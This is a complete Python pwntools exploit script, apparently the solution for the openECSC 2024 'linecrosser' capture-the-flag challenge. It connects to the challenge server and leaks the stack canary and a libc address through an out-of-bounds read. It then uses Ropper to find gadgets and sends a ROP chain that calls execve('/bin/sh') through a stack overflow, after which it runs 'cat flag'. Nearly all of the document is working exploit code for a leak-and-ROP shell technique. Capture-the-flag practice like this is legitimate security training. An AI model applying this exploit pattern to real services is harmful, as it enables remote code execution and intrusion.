#!/usr/bin/env python3
from pwn import ELF, context, process, ui, log, flat, args, remote
from re import search
from ropper import RopperService
from shutil import copyfile
from pathlib import Path
import logging
import os

logging.disable()

HOST = os.environ.get("HOST", "linecrosser.challs.open.ecsc2024.it")
PORT = int(os.environ.get("PORT", 38002))

exe = context.binary = ELF(os.path.join(os.path.dirname(__file__), 'linecrosser'))
remotehost = (HOST, PORT)
options = {
    'color': False,     # if gadgets are printed, use colored output: default: False
    'badbytes': '0a',   # bad bytes which should not be in addresses or ropchains; default: ''
    'all': False,      # Show all gadgets, this means to not remove double gadgets; default: False
    'inst_count': 6,   # Number of instructions in a gadget; default: 6
    'type': 'all',     # rop, jop, sys, all; default: all
    'detailed': False,   # if gadgets are printed, use detailed output; default: False
}
rs = RopperService(options)
libc = ELF(os.path.join(os.path.dirname(__file__), 'libc.so.6'))


def menu(io, choice: int):
    io.sendlineafter(b"4) Exit", f"{choice}".encode())


def create_prompt(io, numcomp: int, content: bytes):
    menu(io, 2)
    io.sendlineafter(b"Answer (1)", b"2")
    io.sendafter(b"prompt", content)
    io.sendlineafter(b"completions?", f"{numcomp}".encode())


def create_answer(io, content: bytes):
    menu(io, 2)
    io.sendlineafter(b"Answer (1)", b"1")
    io.sendlineafter(b"answer", content)


def show_card(io, num: int):
    menu(io, 3)
    io.sendlineafter(b"Answer (1)", b"2")
    io.sendlineafter(b"Which one?", f"{num}".encode())
    content = search(r"Prompt \(([0-9]+) completions\): '", io.recvuntil(b"'").decode()).groups(1)
    return int(content[0], 10)


def search_gadget(exact, search, path):
    if exact == "ret":
        g = rs.searchOpcode(opcode="c3")[path][0]
        log.info(f"Found gadget {g._gadget} for {exact}")
        return g.address
    for f, gadget in rs.search(search=search):
        if exact == gadget._gadget.strip():
            log.info(f"Found gadget {gadget._gadget} for {exact}")
            return gadget.address
    log.error(f"Gadget not found for exact {exact} with search {search}")


def find_gadgets():
    newpath = str(Path("/tmp") / ("libc.cusu" + os.urandom(4).hex()))
    rs.removeFile(newpath)
    copyfile(libc.path, newpath)
    rs.addFile(newpath)
    rs.setImageBaseFor(newpath, libc.address)
    rs.loadGadgetsFor()
    return newpath


def main():
    END = 0x3f8
    CANARY_OFF = 41
    LIBC_OFF = 42
    libc.address = 0

    with remote(*remotehost) as io:

        for _ in range(20 - 3):
            create_answer(io, b"aaa")

        canary = show_card(io, CANARY_OFF)
        log.success(f"{canary = :#018x}")
        address = show_card(io, LIBC_OFF)
        # libc.address = address - (libc.sym['__libc_start_main_impl'] + 0x8b)
        libc.address = address - (libc.sym['__libc_start_main'] + 0x80)
        log.success(f"{libc.address = :#018x}")

        path = find_gadgets()
        RET = search_gadget("ret", "ret", path)
        POP_RDI = search_gadget("pop rdi; ret;", "pop rdi", path)
        POP_RSI = search_gadget("pop rsi; ret;", "pop rsi", path)
        # POP_RDX = search_gadget("pop rdx; ret", "pop rdx")
        chain = flat(
            POP_RDI,
            next(libc.search(b"/bin/sh\x00")),
            POP_RSI,
            0,
            # POP_RDX,
            # 0,
            libc.sym['execve']
        )

        filler = [RET for _ in range((END - len(chain)) // 8)]
        log.info("Now I send payload")
        create_prompt(io, 0, flat({
            0: flat(
                *filler,
                chain,
            ),
            END: flat(
                canary,
            ),
        }))

        # menu(io, 4)

        io.sendline(b"cat flag")
        try:
            io.recvuntil(b"openECSC{", timeout=3)
        except EOFError:
            return False
        flag = b"openECSC{"
        end = io.recvuntil(b"}", timeout=3)
        if b"}" not in end:
            return False
        flag += end
        print(flag.decode())
        return True


if __name__ == '__main__':
    tries = 20
    for i in range(tries):
        print(f"Trying {i + 1}/{tries}...")
        try:
            ok = main()
        except (EOFError, IndexError):
            ok = False
        if ok:
            exit(0)
    print("FAILED - no flag found")
    exit(-1)
